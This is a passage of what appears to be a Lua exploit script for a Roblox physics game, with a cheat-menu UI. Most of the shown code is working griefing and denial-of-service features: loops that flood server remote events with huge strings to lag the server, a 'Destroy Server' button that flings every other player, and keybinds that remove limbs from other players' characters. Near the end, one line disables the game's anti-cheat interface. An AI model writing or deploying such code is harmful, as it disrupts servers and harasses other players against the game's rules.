        offset = CFrame.new(x or 0, v, z or 0)
    end
})
box:AddSlider("Offset", {
    Text = "Z",
    Default = 0,
    Min = -20,
    Max = 20,
    Rounding = 1,
    Callback = function(v)
        z = v
        offset = CFrame.new(x or 0, y or 0, v)
    end
})

box:AddToggle("EnableRagdoll", {
    Text = "Enable Ragdoll Target",
    Default = false,
    Callback = function(v)
        if v then
            local function spawnragdoll()
                PalletForRagdoll = spawntoy("PalletLightBrown", HRP.CFrame * CFrame.new(0, 10, 20))
                repeat task.wait() until PalletForRagdoll and PalletForRagdoll:FindFirstChild("SoundPart")
                repeat task.wait() sno(PalletForRagdoll.SoundPart) until PalletForRagdoll.SoundPart:FindFirstChild("PartOwner")
                PalletForRagdoll.SoundPart.AssemblyLinearVelocity = Vector3.new(0, 1e9, 0)
                for i,v in pairs(PalletForRagdoll:GetChildren()) do
                    if v:IsA("Part") then
                        v.CanCollide = false
                        v.CanQuery = false
                        v.Transparency = 1
                    end
                end
                PalletForRagdoll.Name = "PalletForRagdoll"
                cons["PalletDestroying"] = PalletForRagdoll.Destroying:Once(function()
                    spawnragdoll()
                end)
            end
            spawnragdoll()
        else
            if cons["PalletDestroying"] then
                cons["PalletDestroying"]:Disconnect()
                cons["PalletDestroying"] = nil
            end
            if inv:FindFirstChild("PalletForRagdoll") then
                DestroyToy:FireServer(inv.PalletForRagdoll)
            end
        end
    end
})

box:AddToggle("EnableGrabAntiKick", {
    Text = "Enable Anti Anti Kick",
    Default = false,
    Callback = function(v)
        if v then
            task.spawn(function()
                while Toggles.EnableGrabAntiKick.Value and RunService.RenderStepped:Wait() do
                    if not GrabTarget.Value then return end
                    local tt = Players:FindFirstChild(getname(GrabTarget.Value))
                    if not tt then return end
                    for i,v in pairs(workspace[tt.Name.."SpawnedInToys"]:GetChildren()) do
                        if v:FindFirstChild("StickyPart") and (v.StickyPart.Position - HRP.Position).Magnitude < 30 then
                            sno(v.StickyPart)
                            if v.StickyPart:FindFirstChild("PartOwner") and v.StickyPart.PartOwner.Value == plr.Name then
                                v.StickyPart.CFrame = CFrame.new(0, 0/0, 0)
                            end
                        end
                    end
                end
            end)
        end
    end
})

end

do
local box = Tabs.Target:AddRightGroupbox("Settings", "wrench")

box:AddSlider("BlobDelay", {
    Text = "Blob Delay",
    Default = 0.05,
    Min = 0,
    Max = 1,
    Rounding = 2,
})

end

do
local box = Tabs.Main:AddRightGroupbox("Lags")
local lps = 100
local Packets = 3000
box:AddSlider("LPS", {
    Text = "Lines Per Second",
    Default = 100,
    Min = 1,
    Max = 1000,
    Rounding = 0,
    Callback = function(v)
        lps = v
    end
})

box:AddToggle("LineLag", {
    Text = "Line Lag",
    Default = false,
    Callback = function(v)
        linelag = v
        if v then
            task.spawn(function()
                while linelag do
                    for i=1, lps do
                        CreateLine:FireServer(workspace.SpawnLocation, CFrame.new(0, 9e9, 0))
                    end
                    task.wait(1)
                end
            end)
        end
    end
})

box:AddSlider("Packets", {
    Text = "Packet Strength",
    Default = 3000,
    Min = 100,
    Max = 60000,
    Rounding = 0,
    Callback = function(v)
        Packets = v
    end
})

local AntiDetect = false
box:AddToggle("AntiDetect", {
    Text = "Anti Detect(Packets)",
    Default = false,
    Callback = function(v)
        AntiDetect = v
    end
})

box:AddToggle("PacketLag", {
    Text = "Packets",
    Default = false,
    Callback = function(v)
        PacketsEnabled = v
        if v then
            task.spawn(function()
                while PacketsEnabled and task.wait(0.5) do
                    if AntiDetect then
                        game:GetService("ReplicatedStorage").GrabEvents.CreateGrabLine:FireServer(string.rep("sosoososososossosoososososos", Packets))
                    else
                        game:GetService("ReplicatedStorage").GrabEvents.ExtendGrabLine:FireServer(string.rep("sosoososososossosoososososos", Packets))
                    end
                end
            end)
        end
    end
})

end

do
local box = Tabs.Keybinds:AddLeftGroupbox("Keybinds")

box:AddLabel("Control(Mouse Target)", false):AddKeyPicker("Control", {
    Default = "F",
    Text = "MouseTarget",
    Mode = "Toggle",
    Callback = function(v)
        Control = v
        local tar = Mouse.Target
        if Control and tar and tar.Parent:FindFirstChild("Humanoid") then
            sno(tar.Parent.Head)
            task.spawn(function()
                local oldparent = tar.Parent.Parent
                tar.Parent.Parent = char
                while Control and RunService.RenderStepped:Wait() do
                    if not tar.Parent.Head:FindFirstChild("PartOwner") or tar.Parent.Head:FindFirstChild("PartOwner") and tar.Parent.Head.PartOwner.Value ~= plr.Name then
                        sno(tar.Parent.Head)
                    elseif PalletForRagdoll and PalletForRagdoll:FindFirstChild("SoundPart") then
                        task.spawn(function()
                            if not tar.Parent.Humanoid.Ragdolled.Value then
                                PalletForRagdoll.SoundPart.AssemblyLinearVelocity = Vector3.new(0, 100, 0)
                                PalletForRagdoll.SoundPart.CFrame = tar.Parent.HumanoidRootPart.CFrame
                                task.wait(0.05)
                                PalletForRagdoll.SoundPart.CFrame = CFrame.new(0, 1e9, 0)
                            end
                        end)
                        task.spawn(function()
                            for i,v in tar.Parent:GetChildren() do
                                if char:FindFirstChild(v.Name) and v:IsA("BasePart") and HasProperty(v, "CFrame") then
                                    v.CFrame = char[v.Name].CFrame
                                    stvel(v)
                                    if v:FindFirstChild("RagdollLimbPart") then v.RagdollLimbPart.CanCollide = false end
                                    if v.CanCollide == true then v.CanCollide = false v.CanQuery = false v.CanTouch = false end
                                end
                            end
                        end)
                    end
                end
                tar.Parent.Parent = oldparent
            end)
        end
    end,
})

box:AddLabel("Destroy Limbs", false)

box:AddLabel("Remove Left Leg", false):AddKeyPicker("RemoveLeftLeg", {
    Default = "Z",
    Text = "DestroyLimbs1",
    Mode = "Press",
    Callback = function()
        if workspace:FindFirstChild("GrabParts") and workspace.GrabParts:FindFirstChild("GrabPart") then
            local target = workspace.GrabParts.GrabPart.WeldConstraint.Part1 and workspace.GrabParts.GrabPart.WeldConstraint.Part1.Parent
            if target and target:FindFirstChild("Left Leg") and target:FindFirstChild("Humanoid") and target.Humanoid:FindFirstChild("Ragdolled") then
                if target.Humanoid.Ragdolled.Value then
                    local pos = target["Torso"].CFrame
                    workspace.FallenPartsDestroyHeight = -100
                    target["Left Leg"].CFrame = CFrame.new(0, -1000, 0)
                    task.wait(0.1)
                    target["Torso"].CFrame = CFrame.new(0, -950, 0)
                    task.wait(0)
                    target["Torso"].CFrame = pos
                else
                    Library:Notify("Ragdoll Target pls")
                end
            end
        else
            Library:Notify("Grab someone")
        end
    end,
})

box:AddLabel("Remove Right Leg", false):AddKeyPicker("RemoveRightLeg", {
    Default = "C",
    Text = "DestroyLimbs2",
    Mode = "Press",
    Callback = function()
        if workspace:FindFirstChild("GrabParts") and workspace.GrabParts:FindFirstChild("GrabPart") then
            local target = workspace.GrabParts.GrabPart.WeldConstraint.Part1 and workspace.GrabParts.GrabPart.WeldConstraint.Part1.Parent
            if target and target:FindFirstChild("Right Leg") and target:FindFirstChild("Humanoid") and target.Humanoid:FindFirstChild("Ragdolled") then
                if target.Humanoid.Ragdolled.Value then
                    local pos = target["Torso"].CFrame
                    workspace.FallenPartsDestroyHeight = -100
                    target["Right Leg"].CFrame = CFrame.new(0, -1000, 0)
                    task.wait(0.1)
                    target["Torso"].CFrame = CFrame.new(0, -950, 0)
                    task.wait(0)
                    target["Torso"].CFrame = pos
                else
                    Library:Notify("Ragdoll Target pls")
                end
            end
        else
            Library:Notify("Grab someone")
        end
    end,
})

box:AddLabel("Remove Left Arm", false):AddKeyPicker("RemoveLeftArm", {
    Default = "V",
    Text = "DestroyLimbs3",
    Mode = "Press",
    Callback = function()
        if workspace:FindFirstChild("GrabParts") and workspace.GrabParts:FindFirstChild("GrabPart") then
            local target = workspace.GrabParts.GrabPart.WeldConstraint.Part1 and workspace.GrabParts.GrabPart.WeldConstraint.Part1.Parent
            if target and target:FindFirstChild("Left Arm") and target:FindFirstChild("Humanoid") and target.Humanoid:FindFirstChild("Ragdolled") then
                if target.Humanoid.Ragdolled.Value then
                    local pos = target["Torso"].CFrame
                    workspace.FallenPartsDestroyHeight = -100
                    target["Left Arm"].CFrame = CFrame.new(0, -1000, 0)
                    task.wait(0.1)
                    target["Torso"].CFrame = CFrame.new(0, -950, 0)
                    task.wait(0)
                    target["Torso"].CFrame = pos
                else
                    Library:Notify("Ragdoll Target pls")
                end
            end
        else
            Library:Notify("Grab someone")
        end
    end,
})

box:AddLabel("Remove Right Arm", false):AddKeyPicker("RemoveRightArm", {
    Default = "B",
    Text = "DestroyLimbs4",
    Mode = "Press",
    Callback = function()
        if workspace:FindFirstChild("GrabParts") and workspace.GrabParts:FindFirstChild("GrabPart") then
            local target = workspace.GrabParts.GrabPart.WeldConstraint.Part1 and workspace.GrabParts.GrabPart.WeldConstraint.Part1.Parent
            if target and target:FindFirstChild("Right Arm") and target:FindFirstChild("Humanoid") and target.Humanoid:FindFirstChild("Ragdolled") then
                if target.Humanoid.Ragdolled.Value then
                    local pos = target["Torso"].CFrame
                    workspace.FallenPartsDestroyHeight = -100
                    target["Right Arm"].CFrame = CFrame.new(0, -1000, 0)
                    task.wait(0.1)
                    target["Torso"].CFrame = CFrame.new(0, -950, 0)
                    task.wait(0)
                    target["Torso"].CFrame = pos
                else
                    Library:Notify("Ragdoll Target pls")
                end
            end
        else
            Library:Notify("Grab someone")
        end
    end,
})
end

do
local box = Tabs.Whitelist:AddLeftGroupbox("Whitelist")
local toggle
toggle = box:AddToggle("Whitelist", {
    Text = "Enable Whitelist",
    Default = false,
})

toggle:OnChanged(function(v)
    local val = v and "Disable" or not v and "Enable"
    toggle:SetText(val.." Whitelist")
    WhitelistEnabled = v
end)

end

do
local box = Tabs["Server"]:AddLeftGroupbox("Main")

box:AddButton("Destroy Server(Need Blobman)", function()
    local blob = hum.SeatPart and hum.SeatPart.Parent and hum.SeatPart.Parent.Name == "CreatureBlobman" and hum.SeatPart.Parent
    if not blob then return end
    blob.Name = "blob"
    local CD,CR,CG = blob.BlobmanSeatAndOwnerScript.CreatureDrop, blob.BlobmanSeatAndOwnerScript.CreatureRelease, blob.BlobmanSeatAndOwnerScript.CreatureGrab
    local pos = blob.HumanoidRootPart.CFrame * CFrame.new(0, 30, 0)
    for i,v in game.Players:GetPlayers() do
        pcall(function()
            if v ~= plr and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and (not WhitelistEnabled or not v:IsFriendsWith(plr.UserId)) then
                blob.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame
                task.wait(0.2)
                CG:FireServer(nil, v.Character.HumanoidRootPart, blob.RightDetector.RightWeld)
                CR:FireServer(blob.RightDetector.RightWeld)
            end
        end)
        task.wait(0.1)
    end
    blob.HumanoidRootPart.CFrame = pos
    task.wait(0.1)
    blob.HumanoidRootPart.Anchored = true
    local rotation = 0
    for i,v in game.Players:GetPlayers() do
        pcall(function()
            if v ~= plr and v.Character and v.Character:FindFirstChild("HumanoidRootPart") and isnetworkowner(v.Character.HumanoidRootPart) and (not WhitelistEnabled or not v:IsFriendsWith(plr.UserId)) then
                local bg = Instance.new("BodyGyro", v.Character.HumanoidRootPart)
                bg.CFrame = CFrame.new(0, 0, 0)
                stvel(blob.HumanoidRootPart)
                stvel(v.Character.HumanoidRootPart)
                rotation = rotation + 30
                v.Character.HumanoidRootPart.CFrame = CFrame.new(HRP.Position) * CFrame.Angles(0, math.rad(rotation), 0) * CFrame.new(i, 0, 0)
                stvel(blob.HumanoidRootPart)
                task.wait(0.2)
                sno(v.Character.HumanoidRootPart)
                DestroyLine:FireServer(v.Character.HumanoidRootPart)
                task.wait()
                CG:FireServer(nil, v.Character.HumanoidRootPart, blob.RightDetector.RightWeld)
            end
        end)
        task.wait(0.1)
    end
    task.wait(0.1)
    blob.HumanoidRootPart.Anchored = false
    DestroyToy:FireServer(inv.blob)
end)

-- box:AddToggle("Lobotomy", {
--     Text = "Lobotomy",
--     Default = false,
--     Callback = function(v)
--         Labatamia = v
--         if v then
--             local tractor = spawntoy("TractorGreen", HRP.CFrame * CFrame.new(0, 5, 20))
--             repeat task.wait() until tractor and tractor:FindFirstChild("VehicleSeat")
--             tractor.VehicleSeat:Sit(hum)
--             task.wait(0.1)
--             task.spawn(function()
--                 while task.wait(0.1) and Labatamia do
--                     Ragdoll:FireServer(HRP, 0)
--                 end
--             end)
--             tractor.Name = "Lobotomy:skull:"
--         else
--             hum.Sit = true
--             task.wait(0.1)
--             hum.Sit = false
--         end
--     end
-- })


end

-- box:AddToggle("", {
--     Text = "",
--     Default = false,
--     Callback = function(v)
        
--     end
-- })

-- box:AddSlider("", {
--     Text = "",
--     Default = ,
--     Min = ,
--     Max = ,
--     Rounding = ,
-- })

















local activepackets = false
rs.GrabEvents.ExtendGrabLine.OnClientEvent:Connect(function(player, args)
    if typeof(args) == "string" and string.len(args) > 300 and not activepackets then
        activepackets = true
        local function GetSizeMB(StringLength)
            return StringLength / (1024 * 1024)
        end
        local SizeRounded = math.round(GetSizeMB(string.len(args)) * 1000) / 1000 
        Library:Notify({
            Title = "Posral",
            Description = player.Name.." Enabled Packets Size:"..SizeRounded,
            Time = 4,
        })
        task.wait(4)
        activepackets = false
    end
end)

local MenuGroup = Tabs["UI Settings"]:AddLeftGroupbox("Menu Settings")

MenuGroup:AddButton("Unload", function()
    for i,v in Toggles do
        if not v.Value then continue end
        v:SetValue(false)
    end
    if game.CoreGui:FindFirstChild("SnowGui") then
        game.CoreGui.SnowGui:Destroy()
    end
    workspace.Camera.Blur.Size = 0
	Library:Unload()
end)

MenuGroup:AddLabel("Menu bind"):AddKeyPicker("MenuKeybind", {
    Default = "X",
    NoUI = false,
    Text = "Menu keybind"
})

MenuGroup:AddToggle("AlwaysViewCursor", {
    Text = "Always View Cursor",
    Default = false,
    Callback = function(v)
        alwaysshowcursor = v
        if v then
            task.spawn(function()
                while alwaysshowcursor and task.wait() do
                    UserInputService.MouseIconEnabled = true
                end
            end)
        else
            UserInputService.MouseIconEnabled = false
        end
    end
})

MenuGroup:AddToggle("Snowflakes", {
    Text = "Snowflakes",
    Default = false,
    Callback = function(v)
        Snowflakes = v
    end
})

MenuGroup:AddToggle("Blur", {
    Text = "Blur",
    Default = false,
    Callback = function(v)
        Blur = v
    end
})

Library.ToggleKeybind = Options.MenuKeybind 

ThemeManager:SetLibrary(Library)

ThemeManager:SetFolder("MyScriptHub")

ThemeManager:ApplyToTab(Tabs["UI Settings"])

ThemeManager:LoadDefault()

SaveManager:SetLibrary(Library)

SaveManager:IgnoreThemeSettings()

SaveManager:SetIgnoreIndexes({ "MenuKeybind" })

SaveManager:SetFolder("MyScriptHub/specific-game")

SaveManager:BuildConfigSection(Tabs["UI Settings"])

SaveManager:LoadAutoloadConfig()

local function UpdatePlayerLists()
    local list = {}
    for _, pl in ipairs(Players:GetPlayers()) do
        table.insert(list, pl.DisplayName.." ("..pl.Name..")")
    end
	GrabTarget:SetValues(list)
    BlobmanTarget:SetValues(list)
end

Players.PlayerAdded:Connect(UpdatePlayerLists)
Players.PlayerRemoving:Connect(UpdatePlayerLists)
UpdatePlayerLists()

for i,v in Players:GetPlayers() do
    if v ~= plr then
        if v.Character and v.Character.Humanoid.SeatPart then Seats[v.Name] = v.Character.Humanoid.SeatPart end
        v.CharacterAdded:Connect(function(c)
            c:WaitForChild("Humanoid"):GetPropertyChangedSignal("SeatPart"):Connect(function()
                local seat = c.Humanoid.SeatPart
                if not seat then return end
                print(seat)
                Seats[v.Name] = seat
            end)
        end)
        if v.Character then
            v.Character.Humanoid:GetPropertyChangedSignal("SeatPart"):Connect(function()
                local seat = v.Character.Humanoid.SeatPart
                if not seat then return end
                print(seat)
                Seats[v.Name] = seat
            end)
        end
    end
end

task.spawn(function()
    while task.wait(0.1) do
        if HRP and HRP.Parent then
            HRP.Massless = false
        end
    end
end)

Players.PlayerAdded:Connect(function(p)
    if p ~= plr then
        p.CharacterAdded:Connect(function(c)
            c:WaitForChild("Humanoid"):GetPropertyChangedSignal("SeatPart"):Connect(function()
                local seat = c.Humanoid.SeatPart
                if not seat then return end
                Seats[p.Name] = seat
            end)
        end)
        if p.Character then
            p.Character.Humanoid:GetPropertyChangedSignal("SeatPart"):Connect(function()
                local seat = p.Character.Humanoid.SeatPart
                if not seat then return end
                Seats[p.Name] = seat
            end)
        end
    end
end)

for i,v in Players:GetPlayers() do
    if v ~= plr then
        if v.Character and v.Character.Humanoid.SeatPart then Seats[v.Name] = v.Character.Humanoid.SeatPart end
        v.CharacterAdded:Connect(function(c)
            task.wait(1)
            c.HumanoidRootPart:GetPropertyChangedSignal("Massless"):Connect(function()
                if c.HumanoidRootPart.Massless == true then
                    c.HumanoidRootPart.Massless = false
                end
            end)
        end)
        if v.Character then
            v.Character.HumanoidRootPart:GetPropertyChangedSignal("Massless"):Connect(function()
                if v.Character.HumanoidRootPart.Massless == true then
                    v.Character.HumanoidRootPart.Massless = false
                end
            end)
        end
    end
end

Players.PlayerAdded:Connect(function(p)
    if p ~= plr then
        p.CharacterAdded:Connect(function(c)
            task.wait(1)
            c.HumanoidRootPart:GetPropertyChangedSignal("Massless"):Connect(function()
                if c.HumanoidRootPart.Massless == true then
                    c.HumanoidRootPart.Massless = false
                end
            end)
        end)
        if p.Character then
            p.Character.HumanoidRootPart:GetPropertyChangedSignal("Massless"):Connect(function()
                if p.Character.HumanoidRootPart.Massless == true then
                    p.Character.HumanoidRootPart.Massless = false
                end
            end)
        end
    end
end)

task.wait(3)
task.spawn(function()
    local gui = Instance.new("ScreenGui", game.CoreGui)
    gui.Name = "SnowGui"

    local Frame = Instance.new("Frame", gui)
    Frame.AnchorPoint = Vector2.new(0.5, 0.5)
    Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
    Frame.Size = UDim2.new(1, 0, 1, 0)
    Frame.BackgroundTransparency = 1

    local SNOW_COUNT = 100
    for i = 1, SNOW_COUNT do
        local snow = Instance.new("ImageLabel", Frame)
        local corner = Instance.new("UICorner", snow)
        snow.AnchorPoint = Vector2.new(0.5, 0)
        snow.Position = UDim2.new(math.random(), 0, -0.1, 0)
        snow.Size = UDim2.new(0, 10, 0, 10)
        snow.BackgroundTransparency = 0
        snow.BackgroundColor3 = Color3.fromRGB(255,255,255)

        local function fall()
            local tweenInfo = TweenInfo.new(3 + math.random(), Enum.EasingStyle.Linear)
            local tweenGoal = {Position = UDim2.new(snow.Position.X.Scale, 0, 1, 0)}
            local tween = TweenService:Create(snow, tweenInfo, tweenGoal)
            tween:Play()
            
            tween.Completed:Connect(function()
                snow.Position = UDim2.new(math.random(), 0, -0.1, 0)
                fall()
            end)
        end
        
        fall()
    end
    local fr
    for i,v in gethui().Obsidian.Main:GetChildren() do
        if v:IsA("Frame") and v.Position == UDim2.new(0,0,0,0) then
            fr = v
        end
    end
    local clone = fr.ImageLabel:Clone()
    clone.Parent = fr
    clone.Position = UDim2.new(0, 70, 0.5, -35)
    clone.Size = UDim2.new(0, 100, 0, 100)
    clone.Image = "rbxassetid://76851200088912"
    clone.ImageColor3 = Color3.fromRGB(255, 255, 255)
    clone.ImageRectOffset = Vector2.new(0,0)
    clone.ImageRectSize = Vector2.new(0,0)
    while task.wait(0.1) do
        gui.Enabled = Snowflakes and gethui().Obsidian.Main.Visible
        workspace.Camera.Blur.Enabled = Blur and gethui().Obsidian.Main.Visible
        workspace.Camera.Blur.Size = 30
    end
end)

game:GetService("Players").LocalPlayer.PlayerGui.GameCorrectionsGui.GameCorrectionsUiController.Enabled = false
